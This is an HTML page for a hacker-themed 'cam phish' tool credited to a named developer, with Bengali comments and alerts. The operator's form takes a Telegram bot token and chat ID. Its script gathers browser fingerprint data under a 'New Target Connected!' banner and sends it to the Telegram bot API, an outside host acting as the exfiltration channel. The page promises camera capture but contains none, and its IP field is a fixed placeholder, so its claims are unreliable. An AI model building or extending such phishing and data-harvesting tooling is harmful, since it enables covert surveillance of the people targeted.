<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NINJA CAM PHISH - CYBER MATRIX</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Courier New', Courier, monospace;
        }
        body {
            background-color: #0b0f0b;
            color: #00ff66;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 10px;
            overflow-x: hidden;
            background-image: linear-gradient(rgba(0, 255, 102, 0.03) 1px, transparent 1px);
            background-size: 100% 4px;
        }
        .container {
            width: 100%;
            max-width: 420px;
            background: #050805;
            border: 2px solid #00ff66;
            border-radius: 12px;
            box-shadow: 0 0 20px rgba(0, 255, 102, 0.2);
            padding: 15px;
            position: relative;
        }
        .header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-bottom: 1px solid #00ff66;
            padding-bottom: 8px;
            margin-bottom: 15px;
        }
        .dots {
            display: flex;
            gap: 6px;
        }
        .dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
        }
        .red { background: #ff5f56; }
        .yellow { background: #ffbd2e; }
        .green { background: #27c93f; }
        .terminal-title {
            font-size: 11px;
            color: #00ff66;
        }
        .screen-icon {
            text-align: center;
            margin: 15px 0;
        }
        .screen-icon img, .screen-icon svg {
            width: 60px;
            height: 60px;
            fill: #00ff66;
        }
        h1 {
            text-align: center;
            font-size: 20px;
            letter-spacing: 2px;
            margin-bottom: 20px;
            text-shadow: 0 0 8px rgba(0, 255, 102, 0.5);
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            font-size: 12px;
            margin-bottom: 5px;
            font-weight: bold;
        }
        input {
            width: 100%;
            background: #020402;
            border: 1px solid #00ff66;
            border-radius: 6px;
            padding: 10px;
            color: #00ff66;
            font-size: 12px;
            outline: none;
            box-shadow: inset 0 0 5px rgba(0, 255, 102, 0.1);
        }
        input:focus {
            box-shadow: 0 0 10px rgba(0, 255, 102, 0.4);
        }
        .btn {
            width: 100%;
            background: transparent;
            border: 2px solid #00ff66;
            color: #00ff66;
            padding: 12px;
            font-weight: bold;
            font-size: 14px;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 10px;
            letter-spacing: 1px;
            transition: 0.3s;
            text-shadow: 0 0 5px rgba(0, 255, 102, 0.5);
            box-shadow: 0 0 10px rgba(0, 255, 102, 0.2);
        }
        .btn:hover {
            background: #00ff66;
            color: #050805;
        }
        .footer {
            text-align: center;
            font-size: 10px;
            margin-top: 20px;
            border-top: 1px dashed #00ff66;
            padding-top: 10px;
            color: #00cc52;
        }
        .footer a {
            color: #00ff66;
            text-decoration: none;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <div class="dots">
                <div class="dot red"></div>
                <div class="dot yellow"></div>
                <div class="dot green"></div>
            </div>
            <div class="terminal-title">root@cybermatrix:~# cam_generator.web</div>
        </div>

        <div class="screen-icon">
            <svg viewBox="0 0 24 24"><path d="M20 18c1.1 0 1.99-.9 1.99-2L22 6c0-1.1-.9-2-2-2H4c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2H0v2h24v-2h-4zM4 6h16v10H4V6z"/></svg>
        </div>

        <h1>NINJA CAM PHISH</h1>

        <form id="phishForm">
            <div class="form-group">
                <label>[root@matrix]$</label>
                <input type="text" value="System Initialized..." readonly>
            </div>

            <div class="form-group">
                <label>🔑 TELEGRAM TOKEN _</label>
                <input type="text" id="botToken" placeholder="Ex: 7156722537:AAEvtWVJetHpPAqe7jguo-TF3GVx..." required>
            </div>

            <div class="form-group">
                <label>🎯 CHAT ID _</label>
                <input type="text" id="chatID" placeholder="Ex: 5080596463" required>
            </div>

            <button type="submit" class="btn">INITIALIZE H@CK</button>
        </form>

        <div class="footer">
            Developer Sujon Islam | <a href="#" target="_blank">Join Telegram Channel</a>
        </div>
    </div>

    <script>
        document.getElementById('phishForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const token = document.getElementById('botToken').value.trim();
            const chatId = document.getElementById('chatID').value.trim();

            if(!token || !chatId) {
                alert('দয়া করে টেলিগ্রাম টোকেন এবং চ্যাট আইডি দিন!');
                return;
            }

            // ডিভাইসের ইনফরমেশন সংগ্রহ করা (আপনার দ্বিতীয় ছবির মতো ফিচার)
            const deviceInfo = `
🚀 *New Target Connected!*
🌐 *IP Address:* Fetching...
💻 *User-Agent:* ${navigator.userAgent}
🖥️ *Screen Size:* ${window.screen.width}x${window.screen.height}
🔋 *Platform:* ${navigator.platform}
🕒 *Language:* ${navigator.language}
            `.trim();

            // টেলিগ্রাম এপিআই-এর মাধ্যমে ডাটা সেন্ড করা
            const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage`;

            fetch(telegramUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: deviceInfo,
                    parse_mode: 'Markdown'
                })
            })
            .then(response => response.json())
            .then(data => {
                if(data.ok) {
                    alert('সাকসেসফুল! টার্গেট ইনফরমেশন টেলিগ্রাম বটে পাঠানো হয়েছে।');
                } else {
                    alert('এরর: দয়া করে সঠিক টেলিগ্রাম টোকেন এবং চ্যাট আইডি দিন।');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('কানেকশন ফেইলড!');
            });
        });
    </script>
</body>
</html>
